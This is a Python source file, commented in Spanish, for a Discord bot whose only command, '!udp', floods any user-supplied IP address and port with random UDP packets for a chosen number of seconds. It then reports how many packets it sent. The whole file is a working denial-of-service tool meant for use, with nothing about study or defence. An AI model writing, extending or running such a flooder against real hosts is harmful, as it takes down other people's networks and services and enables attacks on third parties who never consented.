import discord
from discord.ext import commands
import asyncio
import socket
import random

# Nombre del archivo para guardar el token
TOKEN_FILE = "token.txt"

# Función para leer el token desde el archivo
def leer_token():
    try:
        with open(TOKEN_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

# Función para guardar el token en el archivo
def guardar_token(token):
    with open(TOKEN_FILE, "w") as f:
        f.write(token)

# Obtener el token (primero intentar leerlo del archivo)
token = leer_token()

# Si no hay token en el archivo, pedirlo al usuario
if not token:
    token = input("Por favor, introduce el token de tu bot de Discord: ")
    guardar_token(token)
    print(f"Token guardado en {TOKEN_FILE}")

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True  # Necesario para leer el contenido de los mensajes
bot = commands.Bot(command_prefix="!", intents=intents)

async def udp_flood(ip, port, time):
    """Realiza un ataque UDP Flood."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    min_payload = 570
    max_payload = 1250

    start_time = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start_time) < time:
        # Generar un tamaño de payload aleatorio
        payload_size = random.randint(min_payload, max_payload)
        bytes = random._urandom(payload_size)  # Tamaño del payload aleatorio
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
        except Exception as e:
            print(f"Error al enviar paquete: {e}")  # Imprime el error, importante para debug
        await asyncio.sleep(0.001) # Espera 1 milisegundo (aprox. 1000 pps, pero no garantizado)

    return sent

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user.name}")

@bot.command()
async def udp(ctx, ip=None, port: int = None, time: int = None):
    """Comando para realizar un ataque UDP Flood."""
    if not all([ip, port, time]):
        await ctx.send("Faltan parámetros.  Uso: `!udp <ip> <puerto> <tiempo en segundos>`")
        return

    try:
        #Validación de IP
        socket.inet_aton(ip) #Convierte la IP a formato binario
    except socket.error:
        await ctx.send("La IP proporcionada no es válida.")
        return
    
    # Validación de puerto
    if not (1 <= port <= 65535):
        await ctx.send("El puerto debe estar entre 1 y 65535.")
        return
    
    # Validación del tiempo
    if time <= 0:
         await ctx.send("El tiempo debe ser mayor a cero.")
         return

    await ctx.send(f"Iniciando ataque UDP Flood a {ip}:{port} durante {time} segundos...")
    try:
        sent_packets = await udp_flood(ip, port, time)
        await ctx.send(f"Ataque UDP Flood a {ip}:{port} finalizado.  Se enviaron aproximadamente {sent_packets} paquetes.") # Ajusta el mensaje final
    except Exception as e:
        await ctx.send(f"Ocurrió un error durante el ataque: {e}") # Manejo de errores más robusto

# Iniciar el bot
bot.run(token)
